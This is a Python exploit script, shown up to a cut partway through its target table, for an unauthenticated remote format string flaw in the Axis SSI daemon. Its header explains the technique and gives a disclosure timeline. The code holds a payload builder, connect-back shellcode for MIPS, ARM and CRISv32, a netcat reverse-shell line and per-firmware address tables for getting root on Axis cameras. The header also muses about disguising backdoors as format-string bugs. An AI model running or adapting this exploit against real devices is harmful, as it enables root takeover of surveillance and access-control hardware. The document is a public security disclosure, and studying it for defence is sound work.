#!/usr/bin/env python2.7
#
# [SOF]
#
# [Remote Format String Exploit] Axis Communications MPQT/PACS Server Side Include (SSI) Daemon
# Research and development by bashis <mcw noemail eu> 2016
#
# This format string vulnerability has following characteristic:
# - Heap Based (Exploiting string located on the heap)
# - Blind Attack (No output the remote attacker)(*)
# - Remotly exploitable (As anonymous, no credentials needed)
#
# (*) Not so 'Blind' after all, since the needed addresses can be predicted by statistic.
#
# This exploit has following characteristic:
# - Multiple architecture exploit (MIPS/CRISv32/ARM) [From version 5.20.x]
# - Modifying LHOST/LPORT in shellcode on the fly
# - Manual exploiting of remote targets
# - Simple HTTPS support
# - Basic Authorization support (not needed for this exploit)
# - FMS dictionary and predicted addresses for GOT free() / BSS / Netcat shellcode
# - Multiple shellcodes (ARM, CRISv32, MIPS and Netcat PIPE shell)
# - Exploiting with MIPS, CRISv32 and ARM shellcode will give shell as root
# - Exploiting with ARM Netcat PIPE shell give normally shell as Anonymous (5.2x and 5.4x give shell as root)
# - Multiple FMS exploit techniques
#   - "One-Write-Where-And-What" for MIPS and CRISv32
#     Using "Old Style" POP's
#     Classic exploit using: Count to free() GOT, write shellcode address, jump to shellcode on free() call
#     Shellcode loaded in memory by sending shellcode URL encoded, that SSI daemon decodes and keeps in memory.
#   - "Two-Write-Where-And-What" for ARM
#     1) "Old Style": Writing 1x LSB and 1x MSB by using offsets for GOT free() target address
#     2) "New Style": ARM Arch's have both "Old Style" (>5.50.x) )POPs and "New Style" (<5.40.x) direct parameter access for POP/Write
#     [Big differnce in possibilities between "Old Style" and "New Style", pretty interesting actually]
# - Another way to POP with "Old Style", to be able POPing with low as 1 byte (One byte with %1c instead of eight with %8x)
# - Exploit is quite well documented
#
# Anyhow,
# Everything started from this simple remote request:
#
# ---
# $ echo -en "GET /httpDisabled.shtml?&http_user=%p|%p HTTP/1.0\n\n" | netcat 192.168.0.90 80
# HTTP/1.1 500 Server Error
# Content-Type: text/html; charset=ISO-8859-1
#
# <HTML><HEAD><TITLE>500 Server Error</TITLE></HEAD>
# <BODY><H1>500 Server Error</H1>
# The server encountered an internal error and could not complete your request.
# </BODY></HTML>
# ---
#
# Which gave this output in /var/log/messages on the remote device:
#
# ---
# <CRITICAL> Jan  1 16:05:06 axis /bin/ssid[3110]: ssid.c:635: getpwnam() failed for user: 0x961f0|0x3ac04b10
# <CRITICAL> Jan  1 16:05:06 axis /bin/ssid[3110]: ssid.c:303: Failed to get authorization data.
# ---
#
# Which resulted into an remote exploit for more than 200 unique Axis Communication MPQT/PACS products
#
# ---
# $ netcat -vvlp 31337
# listening on [any] 31337 ...
# 192.168.0.90: inverse host lookup failed: Unknown host
# connect to [192.168.0.1] from (UNKNOWN) [192.168.0.90] 55738
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),6(disk),10(wheel),51(viewer),52(operator),53(admin),54(system),55(ptz)
# pwd
# /usr/html
# ---
#
# Some technical notes:
#
# 1.  Direct addressing with %<argument>$%n is "delayed", and comes in force only after disconnect.
#     Old metod with POP's coming into force instantly
#
# 2.  Argument "0" will be assigned (after using old POP metod and %n WRITE) the next address on stack after POP's)
#     - Would be interesting to investigate why.
#
# 3.  Normal Apache badbytes: 0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20, 0x23, 0x26
#     Goodbytes: 0x01-0x08, 0x0e-0x1f, 0x21-0x22, 0x24-0x25, 0x27-0xff
#
# 3.1 Normal Boa badbytes: 0x00-0x08, 0x0b-0x0c, 0x0e-0x19, 0x80-0xff
#     Goodbytes: 0x09, 0x0a, 0x0d, 0x20-0x7f
#
# 3.2 Apache and Boa, by using URL encoded shellcode as in this exploit:
#     Badbytes = None, Goodbytes = 0x00 - 0xff (Yay!)
#
# 4.  Everything is randomized, except heap.
#
# 5.  My initial attempts to use ROP's was not good, as I didn't want to create
#     one unique FMS key by testing each single firmware version, and using ROP with FMS
#     on heap seems pretty complicated as there is one jump availible, maximum two.
#
# 5.1 Classic GOT write for free() that will jump to shellcode, was the best technique in this case.
#
# 6.  Encoded and Decoded shellcode located in .bss section.
# 6.1 FMS excecuted on heap
#
# 7.  Vulnerable MPQT/PACS architectures: CRISv32, MIPS and ARM
# 7.1 ARM has nonexecutable stack flag bit set (>5.20.x) by default on their binaries/libs,
#     so execute shellcode on heap/stack may be impossible.
# 7.2 ARM shellcode and exploit has been verified by setting executable stack flag bit on binaries,
#     and re-compile of the image.
# 7.3 However, ARM is easily exploitable with netcat shell, that's using the builtin '/bin/sh -c' code to execute.
#
# 8.  This exploit are pretty well documented, more details can be extracted by reading
#     the code and comments.
#
# MIPS ssid maps
# 00400000-0040d000 r-xp 00000000 00:01 2272       /bin/ssid
# 0041d000-0041e000 rw-p 0000d000 00:01 2272       /bin/ssid
# 0041e000-00445000 rwxp 00000000 00:00 0          [heap]
#
# ARM ssid maps
# 00008000-00014000 r-xp 00000000 00:01 2055        /bin/ssid
# 0001c000-0001d000 rw-p 0000c000 00:01 2055        /bin/ssid
# 0001d000-00044000 rw-p 00000000 00:00 0           [heap]
#
# Crisv32 ssid maps
# 00080000-0008c000 r-xp 00000000 1f:03 115        /bin/ssid
# 0008c000-0008e000 rw-p 0000a000 1f:03 115        /bin/ssid
# 0008e000-000b6000 rwxp 0008e000 00:00 0          [heap]
#
# General notes:
#
# When the vul daemon process is exploited, and after popping root connect-back shell,
# the main process are usally restarted by respawnd, after the shell have spawned and taken over the parent process,
# when the main process are fully alive again, I can enjoy the shell, and everybody else can
# enjoy of the camera - that should make all of us happy ;)
# During exploiting, logs says almost nothing, only that the main process restarted.
# Note: Not true with ARM Netcat PIPE shell (as the code will vfork() and wait until child exits)
#
# '&http_user=' is the vuln tag, and the FMS will be excecuted when it will try to do vsyslog(),
# after ssid cannot verify the user, free() are the closest function to be called after
# vsyslog(), needed and perfect to use for jumping.
# There is nothing shown for remote user, possible output of FMS are _only_ shown in log/console.
# So we are pretty blind, but due to fixed FMS keys, that doesn't matter for us - it's predictable by statistics.
#
# Quite surprised to see so many different devices and under one major release version,
# that's covered by one "FMS key". The "FMS key" are valid for all minor versions under the major version.
#
# This made me start thinking how brilliant and clever it would be to make an sophisticated door that's using format string as backdoor,
# which generates no FMS output whatsoever to attacker and unlocked by a 'FMS key', instead of using hardcoded login/password.
#
# - No hardcoded login/password that could easily be found in firmware/software files.
# - Extremely hard to find without local access (and find out what to trigger for opening the door)
# - Nobody can not actually prove it is a sophisticated door for sure. "It's just another bug.. sorry! - here is the fixed version."
#   (Only to close this door, and open another door, somewhere else, in any binary - and try make it harder to find)
#
# Note:
# I don't say that Axis Communication has made this hidden format string by this purpose.
# I can only believe it was a really stupid mistake from Axis side, after I have seen one screen-dump of the CVS changelog of SSI Daemon,
# and another screen-dump with the change made late 2009, from non-vulnerable to vulnerable, in the affected code of logerr().
#
# Vulnerable and exploitable products
#
# A1001, A8004-VE, A9188, C3003, F34, F41, F44, M1124, M1124-E, M1125, M1125-E, M1145, M1145-L, M3006,
# M3007, M3026, M3027, M3037, M7010, M7011, M7014, M7016, P1125, P1353, P1354, P1355, P1357, P1364,
# P1365, P1405, P1405-E, P1405-LE, P1425-E, P1425-LE, P1427, P1427-E, P1435, P3214, P3214-V, P3215,
# P3215-V, P3224, P3224-LVE, P3225-LV, P3353, P3354, P3363, P3364, P3364-L, P3365, P3367, P3384,
# P3707-PE, P3904, P3904-R, P3905, P3915-R, P5414-E, P5415-E, P5514, P5514-E, P5515, P5515-E, P5624,
# P5624-E, P5635-E, P7210, P7214, P7216, P7224, P8535, Q1602, Q1604, Q1614, Q1615, Q1635, Q1635-E,
# Q1765-LE, Q1765-LE-PT, Q1775, Q1931-E, Q1931-E-PT, Q1932-E, Q1932-E-PT, Q1941-E, Q2901-E, Q2901-E-PT,
# Q3504, Q3505, Q6000-E, Q6042, Q6042-C, Q6042-E, Q6042-S, Q6044, Q6044-C, Q6044-E, Q6044-S, Q6045,
# Q6045-C, Q6045-E, Q6045-S, Q6114-E, Q6115-E, Q7411, Q7424-R, Q7436, Q8414, Q8414-LVS, Q8631-E, Q8632-E,
# Q8665-E, Q8665-LE, V5914, V5915, M1054, M1103, M1104, M1113, M1114, M2014-E, M3014, M3113, M3114, M3203,
# M3204, M5013, M5014, M7001, P12/M20, P1204, P1214, P1214-E, P1224-E, P1343, P1344, P1346, P1347, P2014-E,
# P3301, P3304, P3343, P3344, P3346, P3346-E, P5512, P5512-E, P5522, P5522-E, P5532, P5532-E, P5534, P5534-E,
# P5544, P8221, P8513, P8514, P8524, Q1755, Q1910, Q1921, Q1922, Q6032, Q6032-C, Q6032-E, Q6034, Q6034-C,
# Q6034-E, Q6035, Q6035-C, Q6035-E, Q7401, Q7404, Q7406, Q7414, Q8721-E, Q8722-E, C, M1004-W, M1011, M1011-W,
# M1013, M1014, M1025, M1031-W, M1033-W, M1034-W, M1143-L, M1144-L, M3004, M3005, M3011, M3024, M3024-L,
# M3025, M3044-V, M3045-V, M3046-V, P1311, P1428-E, P7701, Q3709-PVE, Q3708-PVE, Q6128-E... and more
#
# http://origin-www.axis.com/ftp/pub_soft/MPQT/SR/service-releases.txt
#
# Firmware versions vulnerable to the SSI FMS exploit
#
# ('V.Vx' == The FMS key used in this exploit)
#
# Firmware      Introduced      CRISv32         MIPS            ARM (no exec heap from >5.20.x)
# 5.00.x        2008            -               -               no
# 5.01.x        2008            no              -               no
# 5.02.x        2008            no              -               -
# 5.05.x        2009            no              -               -
# 5.06.x        2009            no              -               -
# 5.07.x        2009            no              -               no
# 5.08.x        2010            no              -               -
# 5.09.x        2010            no              -               -
# 5.10.x        2009            no              -               -
# 5.11.x        2010            no              -               -
# 5.12.x        2010            no              -               -
# 5.15.x        2010            no              -               -
# 5.16.x        2010            no              -               -
# 5.20.x        2010-2011       5.2x            -               5.2x
# 5.21.x        2011            5.2x            -               5.2x
# 5.22.x        2011            5.2x            -               -
# 5.25.x        2011            5.2x            -               -
# 5.40.x        2011            5.4x            5.4x            5.4x
# 5.41.x        2012            5.4x            -               -
# 5.50.x        2013            5.5x            5.5x            5.4x
# 5.51.x        2013            -               5.4x            -
# 5.55.x        2013            -               5.5x            5.5x
# 5.60.x        2014            -               5.6x            5.6x
# 5.65.x        2014-2015       -               5.6x            -
# 5.70.x        2015            -               5.7x            -
# 5.75.x        2015            -               5.7x            5.7x
# 5.80.x        2015            -               5.8x            5.8x
# 5.81.x        2015            -               5.8x            -
# 5.85.x        2015            -               5.8x            5.8x
# 5.90.x        2015            -               5.9x            -
# 5.95.x        2016            -               5.9x            5.8x
# 6.10.x        2016            -               6.1x            -
# 6.15.x        2016            -               -               6.1x
# 6.20.x        2016            -               6.2x            -
#
# Vendor URL's of still supported and affected products
#
# http://www.axis.com/global/en/products/access-control
# http://www.axis.com/global/en/products/video-encoders
# http://www.axis.com/global/en/products/network-cameras
# http://www.axis.com/global/en/products/audio
#
# Axis Product Security
#
# product-security@axis.com
# http://www.axis.com/global/en/support/product-security
# http://origin-www.axis.com/ftp/pub_soft/MPQT/SR/service-releases.txt
# http://www.axis.com/global/en/support/faq/FAQ116268
#
# Timetable
#
# - Research and Development: 06/01/2016 - 01/06/2016
# - Sent vulnerability details to vendor: 05/06/2016
# - Vendor responce received: 06/06/2016
# - Vendor ACK of findings received: 07/06/2016
# - Vendor sent verification image: 13/06/2016
# - Confirmed that exploit do not work after vendors correction: 13/06/2016
# - Vendor informed about their service release(s): 29/06/2016
# - Sent vendor a copy of the (this) PoC exploit: 29/06/2016
# - Full Disclosure: 18/07/2016
#
# Quote of the day: Never say "whoops! :o", always say "Ah, still interesting! :>"
#
# Have a nice day
# /bashis
#
#####################################################################################

from __future__ import print_function
import sys
import string
import socket
import time
import argparse
import urllib, urllib2, httplib
import base64
import ssl
import re


class do_FMS:

#       POP = "%8x"             # Old style POP's with 8 bytes per POP
    POP = "%1c"             # Old style POP's with 1 byte per POP
    WRITElln = "%lln"       # Write 8 bytes
    WRITEn = "%n"           # Write 4 bytes
    WRITEhn = "%hn"         # Write 2 bytes
    WRITEhhn = "%hhn"       # Write 1 byte

    def __init__(self,targetIP,verbose):
        self.targetIP = targetIP
        self.verbose = verbose
        self.fmscode = ""

    # Mostly used internally in this function
    def Add(self, data):
        self.fmscode += data

    # 'New Style' Double word (8 bytes)
    def AddDirectParameterLLN(self, ADDR):
        self.Add('%')
        self.Add(str(ADDR))
        self.Add('$lln')

    # 'New Style' Word (4 bytes)
    def AddDirectParameterN(self, ADDR):
        self.Add('%')
        self.Add(str(ADDR))
        self.Add('$n')

    # 'New Style' Half word (2 bytes)
    def AddDirectParameterHN(self, ADDR):
        self.Add('%')
        self.Add(str(ADDR))
        self.Add('$hn')

    # 'New Style' One Byte (1 byte)
    def AddDirectParameterHHN(self, ADDR):
        self.Add('%')
        self.Add(str(ADDR))
        self.Add('$hhn')

    # Addressing
    def AddADDR(self, ADDR):
        self.Add('%')
        self.Add(str(ADDR))
        self.Add('u')

    # 'Old Style' POP
    def AddPOP(self, size):
        if size != 0:
            self.Add(self.POP * size)

    # Normally only one will be sent, multiple is good to quick-check for any FMS
    #
    # 'Old Style' Double word (8 bytes)
    def AddWRITElln(self, size):
        self.Add(self.WRITElln * size)

    # 'Old Style' Word (4 bytes)
    def AddWRITEn(self, size):
        self.Add(self.WRITEn * size)

    # 'Old Style' Half word (2 bytes)
    def AddWRITEhn(self, size):
        self.Add(self.WRITEhn * size)

    # 'Old Style' One byte (1 byte)
    def AddWRITEhhn(self, size):
        self.Add(self.WRITEhhn * size)

    # Return the whole FMS string
    def FMSbuild(self):
        return self.fmscode

class HTTPconnect:

    def __init__(self, host, proto, verbose, creds, noexploit):
        self.host = host
        self.proto = proto
        self.verbose = verbose
        self.credentials = creds
        self.noexploit = noexploit

    # Netcat remote connectback shell needs to have raw HTTP connection as we using special characters as '\t','$','`' etc..
    def RAW(self, uri):
        # Connect-timeout in seconds
        timeout = 5
        socket.setdefaulttimeout(timeout)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tmp = self.host.split(':')
        HOST = tmp[0]
        PORT = int(tmp[1])
        if self.verbose:
            print("[Verbose] Sending to:", HOST)
            print("[Verbose] Port:", PORT)
            print("[Verbose] URI:",uri)
        s.connect((HOST, PORT))
        s.send("GET %s HTTP/1.0\r\n\r\n" % uri)
        html = (s.recv(4096)) # We really do not care whats coming back
#               if html:
#                       print "[i] Received:",html
        s.shutdown(3)
        s.close()
        return html


    def Send(self, uri):

        # The SSI daemon are looking for this, and opens a new FD (5), but this does'nt actually
        # matter for the functionality of this exploit, only for future references.
        headers = {
                'User-Agent' : 'MSIE',
        }

        # Connect-timeout in seconds
        timeout = 5
        socket.setdefaulttimeout(timeout)

        url = '%s://%s%s' % (self.proto, self.host, uri)

        if self.verbose:
            print("[Verbose] Sending:", url)

        if self.proto == 'https':
            if hasattr(ssl, '_create_unverified_context'):
                print("[i] Creating SSL Default Context")
                ssl._create_default_https_context = ssl._create_unverified_context

        if self.credentials:
            Basic_Auth = self.credentials.split(':')
            if self.verbose:
                print("[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1])
            try:
                pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
                pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
                auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
                opener = urllib2.build_opener(auth_handler)
                urllib2.install_opener(opener)
            except Exception as e:
                print("[!] Basic Auth Error:",e)
                sys.exit(1)

        if self.noexploit and not self.verbose:
            print("[<] 204 Not Sending!")
            html =  "Not sending any data"
        else:
            data = None
            req = urllib2.Request(url, data, headers)
            rsp = urllib2.urlopen(req)
            if rsp:
                print("[<] %s OK" % rsp.code)
                html = rsp.read()
        return html


class shellcode_db:

    def __init__(self,targetIP,verbose):
        self.targetIP = targetIP
        self.verbose = verbose

    def sc(self,target):
        self.target = target


# Connect back shellcode
#
# CRISv32: Written by myself, no shellcode availible out on "The Internet"
# NCSH: My PoC of netcat FIFO / PIPE reverese shell, w/o '-e' option and with $IFS as separators
# MIPSel: Written by Jacob Holcomb (url encoded by me)
# ARM: http://shell-storm.org/shellcode/files/shellcode-754.php
#
        # Slightly modified syscall's
        MIPSel = string.join([
        #close stdin
        "%ff%ff%04%28" #slti    a0,zero,-1
        "%a6%0f%02%24" #li      v0,4006
        "%4c%f7%f7%03" #syscall 0xdfdfd
        #close stdout
        "%11%11%04%28" #slti    a0,zero,4369
        "%a6%0f%02%24" #li      v0,4006
        "%4c%f7%f7%03" #syscall 0xdfdfd
        #close stderr
        "%fd%ff%0c%24" #li      t4,-3
        "%27%20%80%01" #nor     a0,t4,zero
        "%a6%0f%02%24" #li      v0,4006
        "%4c%f7%f7%03" #syscall 0xdfdfd
        # socket AF_INET (2)
        "%fd%ff%0c%24" #li      t4,-3
        "%27%20%80%01" #nor     a0,t4,zero
        "%27%28%80%01" #nor     a1,t4,zero
        "%ff%ff%06%28" #slti    a2,zero,-1
        "%57%10%02%24" #li      v0,4183
        "%4c%f7%f7%03" #syscall 0xdfdfd
        #
        "%ff%ff%44%30" # andi $a0, $v0, 0xFFFF
        #
        # dup2 stdout
        "%c9%0f%02%24" #li      v0,4041
        "%4c%f7%f7%03" #syscall 0xdfdfd
        #
        # dup2 stderr
        "%c9%0f%02%24" #li      v0,4041
        "%4c%f7%f7%03" #syscall 0xdfdfd
        #
        # Port
        "PP1PP0%05%3c"
        "%01%ff%a5%34"
        #
        "%01%01%a5%20" #addi    a1,a1,257
        "%f8%ff%a5%af" #sw      a1,-8(sp)
        #
        # IP
        "IP3IP4%05%3c"
        "IP1IP2%a5%34"
        #
        "%fc%ff%a5%af" #sw      a1,-4(sp)
        "%f8%ff%a5%23" #addi    a1,sp,-8
        "%ef%ff%0c%24" #li      t4,-17
        "%27%30%80%01" #nor     a2,t4,zero
        "%4a%10%02%24" #li      v0,4170
        "%4c%f7%f7%03" #syscall 0xdfdfd
        #
        "%62%69%08%3c" #lui     t0,0x6962
        "%2f%2f%08%35" #ori     t0,t0,0x2f2f
        "%ec%ff%a8%af" #sw      t0,-20(sp)
        "%73%68%08%3c" #lui     t0,0x6873
        "%6e%2f%08%35" #ori     t0,t0,0x2f6e
        "%f0%ff%a8%af" #sw      t0,-16(sp
        "%ff%ff%07%28" #slti    a3,zero,-1
        "%f4%ff%a7%af" #sw      a3,-12(sp)
        "%fc%ff%a7%af" #sw      a3,-4(sp
        "%ec%ff%a4%23" #addi    a0,sp,-20
        "%ec%ff%a8%23" #addi    t0,sp,-20
        "%f8%ff%a8%af" #sw      t0,-8(sp)
        "%f8%ff%a5%23" #addi    a1,sp,-8
        "%ec%ff%bd%27" #addiu   sp,sp,-20
        "%ff%ff%06%28" #slti    a2,zero,-1
        "%ab%0f%02%24" #li      v0,4011 (execve)
        "%4c%f7%f7%03" #syscall 0xdfdfd
        ], '')

        # Working netcat shell
        # - $PATH will locate 'mkfifo', 'nc' and 'rm'
        # - LHOST / LPORT will be changed on the fly later in the code
        # - 1) make FIFO, 2) netcat back to attacker with STDIN to /bin/sh, and PIPE STDOUT back to the remote via FIFO, 3) remove FIFO when exiting
        # - $IFS = <space><tab><newline> [By default, and we need <space> or <tab> as separator]
        # $ echo -n "$IFS" | hexdump -C
        # 00000000  20 09 0a
        # - $PS1 = $ [By default, and we need something to "comment" out our trailing FMS code from /bin/sh -c]
        #
        # '2>/tmp/s' (STDERR > FIFO) Don't work with $IFS as separator
        #
        # Working with Apache and Boa
#               NCSH = "mkfifo$IFS/tmp/s;nc$IFS-w$IFS\"5\"$IFS\"LHOST\"$IFS\"LPORT\"$IFS0</tmp/s|/bin/sh>/tmp/s\"$IFS\"2>/tmp/s;rm$IFS/tmp/s;$PS1"
        NCSH = "mkfifo$IFS/tmp/s;nc$IFS-w$IFS\"5\"$IFS\"LHOST\"$IFS\"LPORT\"$IFS0</tmp/s|/bin/sh>/tmp/s;rm$IFS/tmp/s;$PS1"

        ARMel = string.join([
        # original: http://shell-storm.org/shellcode/files/shellcode-754.php
        # 32-bit instructions, enter thumb mode
        "%01%10%8f%e2"  # add r1, pc, #1
        "%11%ff%2f%e1"  # bx r1

        # 16-bit thumb instructions follow
        #
        # socket(2, 1, 0)
        "%02%20"        #mov     r0, #2
        "%01%21"        #mov     r1, #1
        "%92%1a"        #sub     r2, r2, r2
        "%0f%02"        #lsl     r7, r1, #8
        "%19%37"        #add     r7, r7, #25
        "%01%df"        #svc     1
        #
        # connect(r0, &addr, 16)
        "%06%1c"        #mov     r6, r0
        "%08%a1"        #add     r1, pc, #32
        "%10%22"        #mov     r2, #16
        "%02%37"        #add     r7, #2
        "%01%df"        #svc     1
        #
        # dup2(r0, 0/1/2)
        "%3f%27"        #mov     r7, #63
        "%02%21"        #mov     r1, #2
        #
        #lb:
        "%30%1c"        #mov     r0, r6
        "%01%df"        #svc     1
        "%01%39"        #sub     r1, #1
        "%fb%d5"        #bpl     lb
        #
        # execve("/bin/sh", ["/bin/sh", 0], 0)
        "%05%a0"        #add     r0, pc, #20
        "%92%1a"        #sub     r2, r2, r2
        "%05%b4"        #push    {r0, r2}
        "%69%46"        #mov     r1, sp
        "%0b%27"        #mov     r7, #11
        "%01%df"        #svc     1
        #
        "%c0%46"        # .align 2 (NOP)
        "%02%00"        # .short 0x2            (struct sockaddr)
        "PP1PP0"        # .short 0x3412         (port: 0x1234)
        "IP1IP2IP3IP4"  #.byte 192,168,57,1     (ip: 192.168.57.1)
        # .ascii "/bin/sh\0\0"
        "%2f%62%69%6e"  # /bin
        "%2f%73%68%00%00"       # /sh\x00\x00
        "%00%00%00%00"
        "%c0%46"
        ], '')


        # Connect-back shell for Axis CRISv32
        # Written by mcw noemail eu 2016
        #
        CRISv32 = string.join([
        #close(0)
        "%7a%86"                # clear.d r10
        "%5f%9c%06%00"          # movu.w 0x6,r9
        "%3d%e9"                # break 13
        #close(1)
        "%41%a2"                # moveq 1,r10
        "%5f%9c%06%00"          # movu.w 0x6,r9
        "%3d%e9"                # break 13
        #close(2)
        "%42%a2"                # moveq 2,r10
        "%5f%9c%06%00"          # movu.w 0x6,r9
        "%3d%e9"                # break 13
        #
        "%10%e1"                # addoq 16,sp,acr
        "%42%92"                # moveq 2,r9
        "%df%9b"                # move.w r9,[acr]
        "%10%e1"                # addoq 16,sp,acr
        "%02%f2"                # addq 2,acr
        #PORT
        "%5f%9ePP1PP0"          # move.w 0xPP1PP0,r9 #
        "%df%9b"                # move.w r9,[acr]
        "%10%e1"                # addoq 16,sp,acr
        "%6f%96"                # move.d acr,r9
        "%04%92"                # addq 4,r9
        #IP
        "%6f%feIP1IP2IP3IP4"    # move.d IP4IP3IP2IP1,acr
        "%e9%fb"                # move.d acr,[r9]
        #
        #socket()
        "%42%a2"                # moveq 2,r10
        "%41%b2"                # moveq 1,r11
        "%7c%86"                # clear.d r12
        "%6e%96"                # move.d $sp,$r9
        "%e9%af"                # move.d $r10,[$r9+]
        "%e9%bf"                # move.d $r11,[$r9+]
        "%e9%cf"                # move.d $r12,[$r9+]
        "%41%a2"                # moveq 1,$r10
        "%6e%b6"                # move.d $sp,$r11
        "%5f%9c%66%00"          # movu.w 0x66,$r9
        "%3d%e9"                # break 13
        #
        "%6a%96"                # move.d $r10,$r9
        "%0c%e1"                # addoq 12,$sp,$acr
        "%ef%9b"                # move.d $r9,[$acr]
        "%0c%e1"                # addoq 12,$sp,$acr
        "%6e%96"                # move.d $sp,$r9
        "%10%92"                # addq 16,$r9
        "%6f%aa"                # move.d [$acr],$r10
        "%69%b6"                # move.d $r9,$r11
        "%50%c2"                # moveq 16,$r12
        #
        # connect()
        "%6e%96"                # move.d $sp,$r9
        "%e9%af"                # move.d $r10,[$r9+]
        "%e9%bf"                # move.d $r11,[$r9+]
        "%e9%cf"                # move.d $r12,[$r9+]
        "%43%a2"                # moveq 3,$r10
        "%6e%b6"                # move.d $sp,$r11
        "%5f%9c%66%00"          # movu.w 0x66,$r9
        "%3d%e9"                # break 13
        # dup(0) already in socket
        #dup(1)
        "%6f%aa"                # move.d [$acr],$r10
        "%41%b2"                # moveq 1,$r11
        "%5f%9c%3f%00"          # movu.w 0x3f,$r9
        "%3d%e9"                # break 13
        #
        #dup(2)
        "%6f%aa"                # move.d [$acr],$r10
        "%42%b2"                # moveq 2,$r11
        "%5f%9c%3f%00"          # movu.w 0x3f,$r9
        "%3d%e9"                # break 13
        #
        #execve("/bin/sh",NULL,NULL)
        "%90%e2"                # subq 16,$sp
        "%6e%96"                # move.d $sp,$r9
        "%6e%a6"                # move.d $sp,$10
        "%6f%0e%2f%2f%62%69"    # move.d 69622f2f,$r0
        "%e9%0b"                # move.d $r0,[$r9]
        "%04%92"                # addq 4,$r9
        "%6f%0e%6e%2f%73%68"    # move.d 68732f6e,$r0
        "%e9%0b"                # move.d $r0,[$r9]
        "%04%92"                # addq 4,$r9
        "%79%8a"                # clear.d [$r9]
        "%04%92"                # addq 4,$r9
        "%79%8a"                # clear.d [$r9]
        "%04%92"                # addq 4,$r9
        "%e9%ab"                # move.d $r10,[$r9]
        "%04%92"                # addq 4,$r9
        "%79%8a"                # clear.d [$r9]
        "%10%e2"                # addq 16,$sp
        "%6e%f6"                # move.d $sp,$acr
        "%6e%96"                # move.d $sp,$r9
        "%6e%b6"                # move.d $sp,$r11
        "%7c%86"                # clear.d $r12
        "%4b%92"                # moveq 11,$r9
        "%3d%e9"                # break 13
                ], '')


        if self.target == 'MIPSel':
            return MIPSel
        elif self.target == 'ARMel':
            return ARMel
        elif self.target == 'CRISv32':
            return CRISv32
        elif self.target == 'NCSH1':
            return NCSH
        elif self.target == 'NCSH2':
            return NCSH
        else:
            print("[!] Unknown shellcode! (%s)" % str(self.target))
            sys.exit(1)


class FMSdb:

    def __init__(self,targetIP,verbose):
        self.targetIP = targetIP
        self.verbose = verbose

    def FMSkey(self,target):
        self.target = target

        target_db = {

#-----------------------------------------------------------------------
# All pointing from free() GOT to shellcode on .bss (Except ARM with NCSH)
#-----------------------------------------------------------------------

#
# Using POP format string, AKA 'Old Style'
#
        # MPQT
        'MIPS-5.85.x':   [
                        0x41f370,       # Adjust to GOT free() address
                        0x420900,       # .bss shellcode address
                        2,              # 1st POP's
                        2,              # 2nd POP's
                        'axi',          # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-5.40.3': [
                        0x41e41c,       # Adjust to GOT free() address
                        0x4208cc,       # .bss shellcode address
                        7,              # 1st POP's
                        11,             # 2nd POP's
                        'ax',           # Aligns injected code
                        450,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-5.4x': [
                        0x41e4cc,       # Adjust to GOT free() address
                        0x42097c,       # .bss shellcode address
                        7,              # 1st POP's
                        11,             # 2nd POP's
                        'ax',           # Aligns injected code
                        450,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-5.5x': [
                        0x41d11c,       # Adjust to GOT free() address
                        0x41f728,       # .bss shellcode address
                        5,              # 1st POP's
                        15,             # 2nd POP's
                        'axis',         # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-5.55x': [
                        0x41d11c,       # Adjust to GOT free() address
                        0x41f728,       # .bss shellcode address
                        11,             # 1st POP's
                        9,              # 2nd POP's
                        'axis',         # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # Shared with MPQT and PACS
        'MIPS-5.6x': [
                        0x41d048,       # Adjust to GOT free() address
                        0x41f728,       # .bss shellcode address
                        5,              # 1st POP's
                        15,             # 2nd POP's
                        'axis',         # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type

        ],

        # MPQT
        'MIPS-5.7x': [
                        0x41d04c,       # Adjust to GOT free() address
                        0x41f718,       # .bss shellcode address
                        2,              # 1st POP's
                        14,             # 2nd POP's
                        'axis',         # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-5.75x': [
                        0x41c498,       # Adjust to GOT free() address
                        0x41daf0,       # .bss shellcode address
                        3,              # 1st POP's
                        13,             # 2nd POP's
                        'axi',          # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # Shared with MPQT and PACS
        'MIPS-5.8x': [
                        0x41d0c0,       # Adjust to GOT free() address
                        0x41e740,       # .bss shellcode address
                        3,              # 1st POP's
                        13,             # 2nd POP's
                        'axi',          # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-5.9x': [
                        0x41d0c0,       # Adjust to GOT free() address
                        0x41e750,       # .bss shellcode address
                        3,              # 1st POP's
                        13,             # 2nd POP's
                        'axi',          # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-6.1x': [
                        0x41c480,       # Adjust to GOT free() address
                        0x41dac0,       # .bss shellcode address
                        3,              # 1st POP's
                        13,             # 2nd POP's
                        'axi',          # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-6.2x': [
                        0x41e578,       # Adjust to GOT free() address
                        0x41fae0,       # .bss shellcode address
                        2,              # 1st POP's
                        2,              # 2nd POP's
                        'axi',          # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # MPQT
        'MIPS-6.20x': [
                        0x41d0c4,       # Adjust to GOT free() address
